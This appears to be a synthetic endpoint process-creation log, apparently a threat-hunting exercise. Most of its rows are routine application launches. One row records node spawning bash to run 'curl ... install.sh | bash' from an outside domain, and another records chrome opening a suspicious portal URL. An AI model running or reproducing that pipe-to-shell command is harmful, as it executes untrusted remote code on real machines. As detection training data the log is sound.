2026-03-13 21:25:00.620,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f0144264ffaa4000f0144264ffaa4000f0144264ffaa4000f0144264ffaa4
2026-03-13 21:30:07.829,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0016e332d3e8bda70016e332d3e8bda70016e332d3e8bda70016e332d3e8bda7
2026-03-13 21:33:13.469,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b0dbec5a01430017b0dbec5a01430017b0dbec5a01430017b0dbec5a0143
2026-03-13 21:39:27.647,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00071a59324ac06d00071a59324ac06d00071a59324ac06d00071a59324ac06d
2026-03-13 21:53:34.508,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000406f608195f0c000406f608195f0c000406f608195f0c000406f608195f0c
2026-03-13 21:57:31.433,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0010334eddc298410010334eddc298410010334eddc298410010334eddc29841
2026-03-13 22:11:01.130,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00019ae2e53b3cb000019ae2e53b3cb000019ae2e53b3cb000019ae2e53b3cb0
2026-03-13 22:16:20.609,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00094bebb58e01a900094bebb58e01a900094bebb58e01a900094bebb58e01a9
2026-03-13 22:30:10.740,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00001c767f6f6dda00001c767f6f6dda00001c767f6f6dda00001c767f6f6dda
2026-03-13 22:38:07.345,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=000b109454d3928d000b109454d3928d000b109454d3928d000b109454d3928d
2026-03-13 22:51:49.486,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0006d686907c44f10006d686907c44f10006d686907c44f10006d686907c44f1
2026-03-13 22:57:42.917,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007f23f7c54a4900007f23f7c54a4900007f23f7c54a4900007f23f7c54a490
2026-03-13 23:01:55.305,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0021da2317159dbe0021da2317159dbe0021da2317159dbe0021da2317159dbe
2026-03-13 23:16:25.019,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004fd0fc035d8930004fd0fc035d8930004fd0fc035d8930004fd0fc035d893
2026-03-13 23:25:35.735,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001a283ef54196dc001a283ef54196dc001a283ef54196dc001a283ef54196dc
2026-03-13 23:34:04.216,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001100bcd80f02bd001100bcd80f02bd001100bcd80f02bd001100bcd80f02bd
2026-03-13 23:47:32.548,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000f664c664e872a000f664c664e872a000f664c664e872a000f664c664e872a
2026-03-13 23:59:23.214,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=0008b005b1e406750008b005b1e406750008b005b1e406750008b005b1e40675
2026-03-14 00:13:20.356,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00169c0c0fc4ab8900169c0c0fc4ab8900169c0c0fc4ab8900169c0c0fc4ab89
2026-03-14 00:17:50.340,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c7d444d0c1437001c7d444d0c1437001c7d444d0c1437001c7d444d0c1437
2026-03-14 00:22:03.842,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001dacde37c622a5001dacde37c622a5001dacde37c622a5001dacde37c622a5
2026-03-14 00:26:34.318,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007bde95643e7250007bde95643e7250007bde95643e7250007bde95643e725
2026-03-14 00:37:26.830,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000f82f80379dfb6000f82f80379dfb6000f82f80379dfb6000f82f80379dfb6
2026-03-14 00:51:04.809,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001edd6bdba59ec8001edd6bdba59ec8001edd6bdba59ec8001edd6bdba59ec8
2026-03-14 00:58:44.840,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005e00d52bd9a430005e00d52bd9a430005e00d52bd9a430005e00d52bd9a43
2026-03-14 01:07:56.075,FIN-WS22,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020cf6d51acb15a0020cf6d51acb15a0020cf6d51acb15a0020cf6d51acb15a
2026-03-14 01:18:29.774,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00189c69e873387100189c69e873387100189c69e873387100189c69e8733871
2026-03-14 01:29:13.206,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000770b5a72bc590000770b5a72bc590000770b5a72bc590000770b5a72bc590
2026-03-14 01:37:29.737,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001295e6e183126e001295e6e183126e001295e6e183126e001295e6e183126e
2026-03-14 01:47:35.405,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e51708acb16c4001e51708acb16c4001e51708acb16c4001e51708acb16c4
2026-03-14 01:55:47.445,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000351b584e288f1000351b584e288f1000351b584e288f1000351b584e288f1
2026-03-14 02:10:32.612,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0013c243ec95ecdc0013c243ec95ecdc0013c243ec95ecdc0013c243ec95ecdc
2026-03-14 02:14:05.980,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=00235901ed2b0dea00235901ed2b0dea00235901ed2b0dea00235901ed2b0dea
2026-03-14 02:23:43.994,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010021ab74bb97d0010021ab74bb97d0010021ab74bb97d0010021ab74bb97d
2026-03-14 02:36:09.513,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000160e82ed0bdc7000160e82ed0bdc7000160e82ed0bdc7000160e82ed0bdc7
2026-03-14 02:39:23.277,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001be3fb2a222634001be3fb2a222634001be3fb2a222634001be3fb2a222634
2026-03-14 02:45:57.864,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e7e2fc3ec5116001e7e2fc3ec5116001e7e2fc3ec5116001e7e2fc3ec5116
2026-03-14 02:59:20.356,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0007deb4e308dbc00007deb4e308dbc00007deb4e308dbc00007deb4e308dbc0
2026-03-14 03:10:46.090,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00189cba137a513600189cba137a513600189cba137a513600189cba137a5136
2026-03-14 03:25:14.740,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00202b5f4e9698b200202b5f4e9698b200202b5f4e9698b200202b5f4e9698b2
2026-03-14 03:39:12.456,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000863d5b5086875000863d5b5086875000863d5b5086875000863d5b5086875
2026-03-14 03:46:28.045,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=0019705c607e5ddf0019705c607e5ddf0019705c607e5ddf0019705c607e5ddf
2026-03-14 03:54:58.908,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b84d9870c2cdd001b84d9870c2cdd001b84d9870c2cdd001b84d9870c2cdd
2026-03-14 04:06:13.555,FIN-WS31,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c72d9da699997001c72d9da699997001c72d9da699997001c72d9da699997
2026-03-14 04:19:16.275,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015098bb56a366e0015098bb56a366e0015098bb56a366e0015098bb56a366e
2026-03-14 04:31:14.705,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0019040df02b5e710019040df02b5e710019040df02b5e710019040df02b5e71
2026-03-14 04:41:30.616,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00158132ee9f7c9d00158132ee9f7c9d00158132ee9f7c9d00158132ee9f7c9d
2026-03-14 04:47:34.842,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017e5b6a3da69210017e5b6a3da69210017e5b6a3da69210017e5b6a3da6921
2026-03-14 04:56:26.182,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00191fb70dcd2c5200191fb70dcd2c5200191fb70dcd2c5200191fb70dcd2c52
2026-03-14 05:10:51.651,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000481bbe60310ca000481bbe60310ca000481bbe60310ca000481bbe60310ca
2026-03-14 05:20:23.107,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=00063500f43b36b800063500f43b36b800063500f43b36b800063500f43b36b8
2026-03-14 05:24:14.813,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000df9692d6ac799000df9692d6ac799000df9692d6ac799000df9692d6ac799
2026-03-14 05:30:52.888,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0000ffbbcb40129d0000ffbbcb40129d0000ffbbcb40129d0000ffbbcb40129d
2026-03-14 05:42:08.660,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017169c93709db00017169c93709db00017169c93709db00017169c93709db0
2026-03-14 05:50:30.837,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008af544ca25d370008af544ca25d370008af544ca25d370008af544ca25d37
2026-03-14 05:54:36.504,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007bb2548ded6aa0007bb2548ded6aa0007bb2548ded6aa0007bb2548ded6aa
2026-03-14 06:03:10.559,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=0012cd391bf184810012cd391bf184810012cd391bf184810012cd391bf18481
2026-03-14 06:09:33.670,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fe46497662249001fe46497662249001fe46497662249001fe46497662249
2026-03-14 06:18:50.058,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001abf3cd6183c91001abf3cd6183c91001abf3cd6183c91001abf3cd6183c91
2026-03-14 06:26:55.862,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=0013d7d62e13faf90013d7d62e13faf90013d7d62e13faf90013d7d62e13faf9
2026-03-14 06:41:20.911,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=0010f0663da6829f0010f0663da6829f0010f0663da6829f0010f0663da6829f
2026-03-14 06:52:42.061,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0018bef6bdb021590018bef6bdb021590018bef6bdb021590018bef6bdb02159
2026-03-14 07:06:19.898,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001520060fd2b880001520060fd2b880001520060fd2b880001520060fd2b88
2026-03-14 07:10:10.396,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bb420a871b1f1001bb420a871b1f1001bb420a871b1f1001bb420a871b1f1
2026-03-14 07:16:55.273,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a36f40886c115001a36f40886c115001a36f40886c115001a36f40886c115
2026-03-14 07:21:35.226,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020214b799afaac0020214b799afaac0020214b799afaac0020214b799afaac
2026-03-14 07:31:26.253,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016b16cee9890550016b16cee9890550016b16cee9890550016b16cee989055
2026-03-14 07:43:07.579,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=000760b0e8ea8fdc000760b0e8ea8fdc000760b0e8ea8fdc000760b0e8ea8fdc
2026-03-14 07:55:33.023,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001298e887ae94bf001298e887ae94bf001298e887ae94bf001298e887ae94bf
2026-03-14 08:08:23.091,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00174c4330373ccf00174c4330373ccf00174c4330373ccf00174c4330373ccf
2026-03-14 08:13:58.000,FIN-WS22,e.park,1,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe https://review-board-portal.com/session/84e2",C:\Windows\explorer.exe,,,SHA256=77009e7fea4910b7cc067dba3daf02d8722756a959f373cf04d0e8f372894cfb
2026-03-14 08:16:34.388,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00191e7f04fa2f0500191e7f04fa2f0500191e7f04fa2f0500191e7f04fa2f05
2026-03-14 08:30:05.172,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001cfd07676fda39001cfd07676fda39001cfd07676fda39001cfd07676fda39
2026-03-14 08:41:09.856,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00191d7a92cfa3b800191d7a92cfa3b800191d7a92cfa3b800191d7a92cfa3b8
2026-03-14 08:52:20.302,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=00038d81c0ffe50500038d81c0ffe50500038d81c0ffe50500038d81c0ffe505
2026-03-14 09:06:51.222,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000981ab267f0524000981ab267f0524000981ab267f0524000981ab267f0524
2026-03-14 09:17:30.680,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a304a0d5f724b000a304a0d5f724b000a304a0d5f724b000a304a0d5f724b
2026-03-14 09:21:44.307,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003d86f9038bd200003d86f9038bd200003d86f9038bd200003d86f9038bd20
2026-03-14 09:27:00.740,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00221f075b85e17800221f075b85e17800221f075b85e17800221f075b85e178
2026-03-14 09:33:13.210,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=001ee989d403369b001ee989d403369b001ee989d403369b001ee989d403369b
2026-03-14 09:36:22.112,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e3b73358803ef000e3b73358803ef000e3b73358803ef000e3b73358803ef
2026-03-14 09:46:05.983,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000daaa33b2b7c24000daaa33b2b7c24000daaa33b2b7c24000daaa33b2b7c24
2026-03-14 09:55:10.070,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=001186ce9bf769ad001186ce9bf769ad001186ce9bf769ad001186ce9bf769ad
2026-03-14 10:06:11.000,MAC-DEV-17,r.kapoor,1,/bin/bash,"bash -c curl -fsSL https://cdn-build-linker.com/install.sh | bash",/usr/local/bin/node,,,SHA256=8c117ac5f74747e9013c8f55b4c56bcf1aaf0cb8f151bdf224426817e2f82424
2026-03-14 10:07:30.770,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000d922a2711cfd5000d922a2711cfd5000d922a2711cfd5000d922a2711cfd5
2026-03-14 10:17:07.238,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00220bdea7d8acb200220bdea7d8acb200220bdea7d8acb200220bdea7d8acb2
2026-03-14 10:30:23.922,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000edef89ef39a3a000edef89ef39a3a000edef89ef39a3a000edef89ef39a3a
2026-03-14 10:40:51.008,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0017f413dde4013c0017f413dde4013c0017f413dde4013c0017f413dde4013c
2026-03-14 10:48:15.195,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=00218032a963612800218032a963612800218032a963612800218032a9636128
2026-03-14 10:58:33.528,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=0018793d96348f210018793d96348f210018793d96348f210018793d96348f21
2026-03-14 11:06:08.533,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000c2d9f198b14aa000c2d9f198b14aa000c2d9f198b14aa000c2d9f198b14aa
2026-03-14 11:12:30.979,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00188282bdd838c000188282bdd838c000188282bdd838c000188282bdd838c0
2026-03-14 11:27:08.973,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c4f3fb6bcb770000c4f3fb6bcb770000c4f3fb6bcb770000c4f3fb6bcb770
2026-03-14 11:37:55.963,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e0717e2390661001e0717e2390661001e0717e2390661001e0717e2390661
2026-03-14 11:50:55.541,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00151e2d8d23895500151e2d8d23895500151e2d8d23895500151e2d8d238955
2026-03-14 12:03:16.875,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000247231fd7810a000247231fd7810a000247231fd7810a000247231fd7810a
2026-03-14 12:17:35.473,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000cea54d2ae35fe000cea54d2ae35fe000cea54d2ae35fe000cea54d2ae35fe
2026-03-14 12:24:04.907,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000fb31c816e6e01000fb31c816e6e01000fb31c816e6e01000fb31c816e6e01
2026-03-14 12:36:15.389,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=0016a6d0cf306eb00016a6d0cf306eb00016a6d0cf306eb00016a6d0cf306eb0
2026-03-14 12:50:36.588,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00235daca643a49c00235daca643a49c00235daca643a49c00235daca643a49c
2026-03-14 13:01:38.918,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001b836497a395b3001b836497a395b3001b836497a395b3001b836497a395b3
2026-03-14 13:05:31.221,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000bfdc3aa67b20f000bfdc3aa67b20f000bfdc3aa67b20f000bfdc3aa67b20f
2026-03-14 13:16:06.523,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008baa21ffc0b100008baa21ffc0b100008baa21ffc0b100008baa21ffc0b10
2026-03-14 13:30:02.006,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001a1c890033bb54001a1c890033bb54001a1c890033bb54001a1c890033bb54
2026-03-14 13:35:20.589,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000469ee33d80d67000469ee33d80d67000469ee33d80d67000469ee33d80d67
2026-03-14 13:39:40.814,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015d741a9641b680015d741a9641b680015d741a9641b680015d741a9641b68
2026-03-14 13:45:05.999,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00113148733b4f2b00113148733b4f2b00113148733b4f2b00113148733b4f2b
2026-03-14 13:53:43.161,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002eaaf598fac660002eaaf598fac660002eaaf598fac660002eaaf598fac66
2026-03-14 14:07:12.199,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00109bb18a9b278e00109bb18a9b278e00109bb18a9b278e00109bb18a9b278e
2026-03-14 14:11:45.812,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00222a32c0d00c5200222a32c0d00c5200222a32c0d00c5200222a32c0d00c52
2026-03-14 14:20:25.853,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bccd17e43f7dd001bccd17e43f7dd001bccd17e43f7dd001bccd17e43f7dd
2026-03-14 14:24:58.218,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=000b9d1c407f928e000b9d1c407f928e000b9d1c407f928e000b9d1c407f928e
2026-03-14 14:32:22.371,FIN-WS22,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015f1e7ff75c91c0015f1e7ff75c91c0015f1e7ff75c91c0015f1e7ff75c91c
2026-03-14 14:41:54.539,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00003de2f963a14d00003de2f963a14d00003de2f963a14d00003de2f963a14d
2026-03-14 14:50:58.675,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001a57c959849b29001a57c959849b29001a57c959849b29001a57c959849b29
2026-03-14 14:55:58.994,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007b254f61596850007b254f61596850007b254f61596850007b254f6159685
2026-03-14 15:03:47.159,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0017b72923552da80017b72923552da80017b72923552da80017b72923552da8
2026-03-14 15:13:37.492,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001cd83c2ed96a28001cd83c2ed96a28001cd83c2ed96a28001cd83c2ed96a28
2026-03-14 15:26:10.813,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0013cf1f927f84820013cf1f927f84820013cf1f927f84820013cf1f927f8482
2026-03-14 15:32:26.686,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=001b8857fd0513b3001b8857fd0513b3001b8857fd0513b3001b8857fd0513b3
2026-03-14 15:37:10.547,MAC-DEV-17,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c3dfda1a9dccd001c3dfda1a9dccd001c3dfda1a9dccd001c3dfda1a9dccd
2026-03-14 15:46:41.496,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00229faa994aaf5200229faa994aaf5200229faa994aaf5200229faa994aaf52
2026-03-14 15:50:36.653,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000796d3c5ff8449000796d3c5ff8449000796d3c5ff8449000796d3c5ff8449
2026-03-14 16:00:47.505,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001d679fb901b250001d679fb901b250001d679fb901b250001d679fb901b25
2026-03-14 16:05:55.875,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001611a771afdcd7001611a771afdcd7001611a771afdcd7001611a771afdcd7
2026-03-14 16:19:59.241,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0001962841e4f7710001962841e4f7710001962841e4f7710001962841e4f771
2026-03-14 16:31:22.413,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d2ef7c5711699001d2ef7c5711699001d2ef7c5711699001d2ef7c5711699
2026-03-14 16:38:12.902,FIN-WS22,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0004ac4c17eca8c00004ac4c17eca8c00004ac4c17eca8c00004ac4c17eca8c0
2026-03-14 16:45:04.109,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001699a6bd40a69d001699a6bd40a69d001699a6bd40a69d001699a6bd40a69d
2026-03-14 16:55:56.366,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00075c618ba3c13800075c618ba3c13800075c618ba3c13800075c618ba3c138
2026-03-14 17:10:42.889,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001af3e718ef8541001af3e718ef8541001af3e718ef8541001af3e718ef8541
2026-03-14 17:13:44.067,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0022caf09e231eb60022caf09e231eb60022caf09e231eb60022caf09e231eb6
2026-03-14 17:26:49.909,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0010399e7c389eab0010399e7c389eab0010399e7c389eab0010399e7c389eab
2026-03-14 17:40:33.294,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f745c0ec1a573000f745c0ec1a573000f745c0ec1a573000f745c0ec1a573
2026-03-14 17:45:29.574,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=00116833765ae91100116833765ae91100116833765ae91100116833765ae911
2026-03-14 17:52:55.392,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0021c89cff44db380021c89cff44db380021c89cff44db380021c89cff44db38
2026-03-14 18:05:41.432,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00212c559c7617a400212c559c7617a400212c559c7617a400212c559c7617a4
2026-03-14 18:11:14.002,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00140bec9d94556600140bec9d94556600140bec9d94556600140bec9d945566
2026-03-14 18:24:23.621,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00079819491e2e5700079819491e2e5700079819491e2e5700079819491e2e57
2026-03-14 18:31:06.595,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001a90a5bb1fc6a0001a90a5bb1fc6a0001a90a5bb1fc6a0001a90a5bb1fc6a
2026-03-14 18:41:44.793,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d4434be9721e4000d4434be9721e4000d4434be9721e4000d4434be9721e4
2026-03-14 18:54:48.908,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=002361aa5d182956002361aa5d182956002361aa5d182956002361aa5d182956
2026-03-14 18:59:02.051,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0019bcab5bd680ab0019bcab5bd680ab0019bcab5bd680ab0019bcab5bd680ab
2026-03-14 19:04:08.171,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008696d8693a69e0008696d8693a69e0008696d8693a69e0008696d8693a69e
2026-03-14 19:18:49.142,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=000dcb0a1564ac6a000dcb0a1564ac6a000dcb0a1564ac6a000dcb0a1564ac6a
2026-03-14 19:28:34.074,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022aee2e33133660022aee2e33133660022aee2e33133660022aee2e3313366
2026-03-14 19:38:20.673,BLD-RUN-02,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0004a995756bc1e80004a995756bc1e80004a995756bc1e80004a995756bc1e8
2026-03-14 19:49:59.886,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000f75235be360bb000f75235be360bb000f75235be360bb000f75235be360bb
2026-03-14 20:00:43.278,FIN-WS22,a.velasquez,1,git,"git",explorer.exe,,,SHA256=00051b8f6ae4baf700051b8f6ae4baf700051b8f6ae4baf700051b8f6ae4baf7
2026-03-14 20:07:03.894,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001770b4c81a0aa5001770b4c81a0aa5001770b4c81a0aa5001770b4c81a0aa5
2026-03-14 20:12:52.126,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b83f581eef07d000b83f581eef07d000b83f581eef07d000b83f581eef07d
2026-03-14 20:18:56.964,MAC-DEV-17,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0021d0144a195afe0021d0144a195afe0021d0144a195afe0021d0144a195afe
2026-03-14 20:24:29.739,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=000094b13fa7b571000094b13fa7b571000094b13fa7b571000094b13fa7b571
2026-03-14 20:32:09.473,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e78d5775cc266000e78d5775cc266000e78d5775cc266000e78d5775cc266
2026-03-14 20:44:52.509,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000ba17d549ea0e5000ba17d549ea0e5000ba17d549ea0e5000ba17d549ea0e5
